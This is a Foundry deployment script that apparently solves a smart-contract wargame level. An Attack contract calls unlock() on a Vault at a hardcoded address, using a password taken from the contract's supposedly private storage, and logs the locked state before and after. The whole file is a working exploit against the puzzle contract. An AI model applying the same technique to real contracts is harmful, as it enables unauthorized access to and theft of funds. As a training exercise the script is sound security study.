// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Vault.sol";

contract VaultScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        new Attack();

        vm.stopBroadcast();
    }
}

contract Attack {
    constructor() {
        Vault target = Vault(0x851F19e99e5A660216BfF977e5b18c7A77B6C854);
        console.log("before: ", target.locked());
        target.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        console.log("after: ", target.locked());
    }
}